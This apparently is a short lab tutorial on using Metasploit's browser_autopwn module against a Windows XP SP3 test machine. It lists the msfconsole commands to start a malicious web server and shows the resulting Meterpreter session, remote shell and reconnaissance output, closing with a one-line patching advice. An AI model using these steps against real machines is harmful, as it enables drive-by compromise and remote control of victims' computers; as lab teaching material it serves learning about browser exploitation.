Metasploit Browser Autopwn – Windows XP SP3
**Attacker:** Kali Linux<br>
**Victim:** Windows XP SP3 (Java 6u25, IE6)<br>
<br>
##Step 1 – Starting the Browser Autopwn Server
Run msfconsole, load the browser_autopwn module and set all required options.<br>
<code>
<div style="background-color: black; color: white; padding: 20px;">
<font color="silver">root@kali:~$</font> <b>msfconsole</b><br>
<font color="silver">msf ></font> <b>use auxiliary/server/browser_autopwn</b><br>
<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set LHOST 192.168.1.12</b><br>
<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set SRVPORT 80</b><br>
<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set URIPATH /</b><br>
<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>run</b><br>
<br>
<font color="silver">[*] Starting exploit modules on host 192.168.1.12...</font><br>
<font color="silver">[*] Server started.</font>
</div>
</code>
The Browser Autopwn Server is now running and waiting for victims to browse to the url http://192.168.1.12<br>
##Step 2 – Pwning the Victim
On your Windows XP test machine (victim), browse to http://192.168.1.12.<br>
This will trigger the browser_autopwn module to serve the appropriate exploit and launch a meterpreter session.<br>
<code>
<div style="background-color: black; color: white; padding: 20px;">
<font color="silver">[*] Meterpreter session 1 opened (192.168.1.12:7777 -> </font><br>
<font color="silver">192.168.1.13:1045) at 2015-07-25 05:08:06 -0400</font><br>
<font color="silver">...</font><br>
<font color="silver">msf auxiliary(browser_autopwn) ></font><b> sessions -i 1</b><br>
<font color="silver">[*] Starting interaction with 1...meterpreter ></font><b> shell</b><br>
<font color="silver">Microsoft Windows XP [Version 5.1.2600]</font><br>
<font color="silver">(C) Copyright 1985-2001 Microsoft Corp.C:\Documents and Settings\IEUser\Desktop></font><b>echo %USERNAME%</b><br>
<font color="silver">Victim</font><br>
<br>
<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><b>ipconfig</b><br>
<font color="silver">Windows IP Configuration</font><br>
<br>
<font color="silver">Ethernet adapter Local Area Connection:</font><br>
<br>
<font color="silver">Connection-specific DNS Suffix . : Home</font><br>
<font color="silver">IP Address. . . . . . . . . . . . : 192.168.1.13</font><br>
<font color="silver">Subnet Mask . . . . . . . . . . . : 255.255.255.0</font><br>
<font color="silver">Default Gateway . . . . . . . . . : 192.168.1.1</font><br>
<br>
<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><br>
</div>
</code>
You now have shell access to the Windows XP SP3 Victim with the same access as the user who navigated to the exploit url.<br>
##Solution
Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.

Tags: metasploit
